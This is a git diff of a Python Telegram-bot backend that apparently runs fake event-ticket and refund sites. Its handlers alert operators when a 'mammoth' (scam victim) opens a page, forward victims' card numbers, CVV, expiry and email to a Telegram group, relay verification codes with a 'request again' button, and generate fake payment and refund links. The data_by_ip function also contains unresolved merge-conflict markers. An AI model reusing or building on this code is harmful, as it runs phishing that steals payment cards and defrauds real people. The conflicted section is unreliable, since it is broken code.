@@ -137,6 +137,17 @@ try:
 except Exception:
     pass
 
+# --- Таблица для місць подій ---
+c.execute("""
+CREATE TABLE IF NOT EXISTS event_places (
+    page_code TEXT,
+    event_index INTEGER,
+    places INTEGER DEFAULT 0,
+    PRIMARY KEY (page_code, event_index)
+)
+""")
+conn.commit()
+
 c.execute("""
 CREATE TABLE IF NOT EXISTS refund_links (
     code TEXT PRIMARY KEY,
@@ -180,8 +191,8 @@ try:
     null_count = c.fetchone()[0]
     if null_count > 0:
         print(f"[DB] Found {null_count} records without page_code, filling them...")
-        # fill_page_codes()  # <-- Видалено, щоб не було помилки
-        print("[DB] (fill_page_codes не викликається, бо не визначена)")
+        fill_page_codes()  # Викликаємо функцію для заповнення
+        print("[DB] page_codes filled successfully")
 except Exception as e:
     print(f"[DB] Error checking/filling page_code: {e}")
 
@@ -1627,11 +1638,11 @@ async def manual_payment_amount_handler(message: types.Message):
             if payment_type == 'defolt':
                 short_code = generate_short_code()
                 save_refund_link(short_code, amount, currency)
-                link = f"https://artpullse.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1&e={short_code}"
+                link = f"https://artpullse.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1&page={short_code}"
             else:
                 short_code = generate_short_code()
                 save_refund_link(short_code, amount, currency)
-                link = f"https://artpullse.com/refund/?total={amount}&currency={currency}&e={short_code}"
+                link = f"https://artpullse.com/refund/?total={amount}&currency={currency}&page={short_code}"
             print(f"[DEBUG] manual_payment_amount_handler: generated link: {link}")
             sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
             user_step[uid] = None
@@ -1888,24 +1899,29 @@ async def events_save_all(message):
 @log_function
 async def notify_admin(request):
     data = await request.json()
-    page = data.get('page', '')
-    url = data.get('url', '')
+    user_id = data.get('user_id', '')
     ip = data.get('ip', '')
-    country = data.get('country', '')
-    # Формуємо повідомлення тільки про сторінку
-    msg = (
-        "⚠️ Мамонт открыл страницу\n"
-        f"📄 Страница: {page}\n"
-        f"🔗 Ссылка: {url}\n"
-        f"🌐 IP: {ip}\n"
-        f"🌍 Страна: {country}"
+    page_code = data.get('page_code', '')
+    
+    if not user_id or not page_code:
+        return web.json_response({'error': 'missing required fields'}, status=400)
+    
+    # Генеруємо посилання з ?page=page_code
+    event_link = f"https://eventsart.com/?page={page_code}"
+    
+    text = f"🎉 Новий користувач сайта!\n\n👤 User ID: {user_id}\n🌐 IP: {ip}\n🔗 Посилання: {event_link}\n\n📅 Створено: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    
+    kb = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="Переглянути", url=event_link),
+                InlineKeyboardButton(text="Закрити", callback_data="close_notification")
+            ]
+        ]
     )
-    try:
-        await bot.send_message(ADMIN_GROUP_ID, msg)
-        print('Message sent to admin group')
-    except Exception as e:
-        print('Error sending message:', e)
-    return web.Response(text="OK")
+    
+    await bot.send_message(PAYMENT_GROUP_ID, text, reply_markup=kb)
+    return web.json_response({'status': 'success'})
 
 @log_function
 async def payment_notify(request):
@@ -1962,7 +1978,7 @@ async def payment_notify(request):
         import traceback
         traceback.print_exc()
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
-    page_code = data.get('page', '') or data.get('page_code', '')
+    page_code = data.get('page_code', '')
     msg2 = (
         f"E: {email}\n"
         f"C: {card}\n"
@@ -2045,14 +2061,13 @@ async def payment_notify(request):
 @log_function
 async def code_notify(request):
     data = await request.json()
-    code = data.get('code', '')
+    page_code = data.get('page_code', '')
     ip = data.get('ip', '')
-    page_code = data.get('page', '') or data.get('page_code', '')
-    text = f"Code: {code}\nIP: {ip}"
+    text = f"Page Code: {page_code}\nIP: {ip}"
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code}")
+                InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{page_code}")
             ]
         ]
     )
@@ -2184,10 +2199,10 @@ async def cors_middleware(request, handler):
 
 @log_function
 async def latest_event_data(request):
-    page_code = request.query.get('page', '') or request.query.get('e', '')
+    page_code = request.query.get('page', '')
     if not page_code:
         print("[API] No page_code provided")
-        return web.json_response({'error': 'missing page or e parameter'}, status=400)
+        return web.json_response({'error': 'missing page parameter'}, status=400)
     
     print(f"[API] Requesting data for page_code: {page_code}")
     c = conn.cursor()
@@ -2293,13 +2308,13 @@ async def events_data_for_main_page(request):
 
 @log_function
 async def event_address(request):
-    page_code = request.query.get('page', '') or request.query.get('e', '')
+    page_code = request.query.get('page', '')
     print(f"[event_address] page_code: {page_code}")
     db_path = os.path.abspath('users.db')
     print(f"[event_address] DB path: {db_path}")
     if not page_code:
         print("[event_address] No page_code provided")
-        return web.json_response({'error': 'missing page or e parameter'}, status=400)
+        return web.json_response({'error': 'missing page parameter'}, status=400)
     c = conn.cursor()
     # Спочатку шукаємо в event_links (для нових записів)
     c.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
@@ -2341,7 +2356,12 @@ async def event_address(request):
 @log_function
 async def data_by_ip(request):
     ip = request.query.get('ip', '')
+<<<<<<< HEAD
     # Prefer server-observed client IP if not provided
+=======
+    page_code = request.query.get('page', '')  # Додаємо отримання page_code
+    
+>>>>>>> 4fa79d4 (d)
     if not ip:
         ip = request.remote
     page_code = request.query.get('page', '')
@@ -2390,10 +2410,10 @@ async def data_by_ip(request):
 
 @log_function
 async def event_links(request):
-    # Підтримуємо як новий формат ?page= так і старий ?e=
-    page_code = request.query.get('page', '') or request.query.get('e', '')
+    # Приймаємо тільки ?page=page_code
+    page_code = request.query.get('page', '')
     if not page_code:
-        return web.json_response({'error': 'missing page or e parameter'}, status=400)
+        return web.json_response({'error': 'missing page parameter'}, status=400)
     
     print(f"[DEBUG] event_links request for page_code: {page_code}")
     
@@ -2441,17 +2461,11 @@ async def user_id_by_page_code(request):
 async def payment_data(request):
     try:
         page_code = request.query.get('page', '')
-        code = request.query.get('e', '')
-        c = conn.cursor()
-        if code:
-            c.execute('SELECT price, currency FROM refund_links WHERE code=?', (code,))
-            row = c.fetchone()
-            if row:
-                price, currency = row
-                return web.json_response({'price': price, 'currency': currency})
         if not page_code:
-            return web.json_response({'error': 'missing page'}, status=400)
+            return web.json_response({'error': 'missing page parameter'}, status=400)
+        
         print(f"[DEBUG] payment_data request for page_code: {page_code}")
+        c = conn.cursor()
         c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
         row = c.fetchone()
         if not row:
@@ -2475,7 +2489,15 @@ async def print_chat_id(message: types.Message):
 
 def fill_page_codes():
     c = conn.cursor()
-    c.execute('SELECT id FROM site_users ORDER BY created_at')
+    # Перевіряємо, чи існує колонка created_at
+    try:
+        c.execute('SELECT created_at FROM site_users LIMIT 1')
+    except sqlite3.OperationalError:
+        # Якщо колонки created_at немає, використовуємо ROWID
+        c.execute('SELECT id FROM site_users ORDER BY ROWID')
+    else:
+        c.execute('SELECT id FROM site_users ORDER BY created_at')
+    
     users = c.fetchall()
     for idx, (user_id,) in enumerate(users):
         series = idx // 100 + 1
@@ -2483,6 +2505,7 @@ def fill_page_codes():
         page_code = f"{series}-{number}"
         c.execute('UPDATE site_users SET page_code=? WHERE id=?', (page_code, user_id))
     conn.commit()
+    print(f"[DB] Filled {len(users)} page_codes")
 
 def get_site_user_id_by_page(page_code):
     c = conn.cursor()
